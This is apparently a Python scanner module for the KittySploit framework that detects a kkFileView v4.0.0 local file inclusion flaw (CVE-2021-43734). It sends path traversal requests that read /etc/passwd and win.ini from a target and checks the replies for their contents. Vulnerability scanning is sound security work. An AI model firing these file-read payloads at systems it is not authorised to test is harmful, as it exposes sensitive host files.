#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""kkFileview v4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'kkFileview v4.0.0 - Local File Inclusion Detection',
        'description': 'kkFileview v4.0.0 is vulnerable to local file inclusion which may lead to a sensitive file leak on a related host.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'kkfileview', 'traversal', 'lfi', 'keking', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/kekingcn/kkFileView/issues/304',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-43734',
            'https://github.com/20142995/Goby',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/ArrestX/--POC',
        ],
        'cve': 'CVE-2021-43734',
    }

    def run(self):
        for path in ('/getCorsFile?urlPath=file:///etc/passwd', '/getCorsFile?urlPath=file:///c://windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:', 'for 16-bit app support',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="kkFileview v4.0.0 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

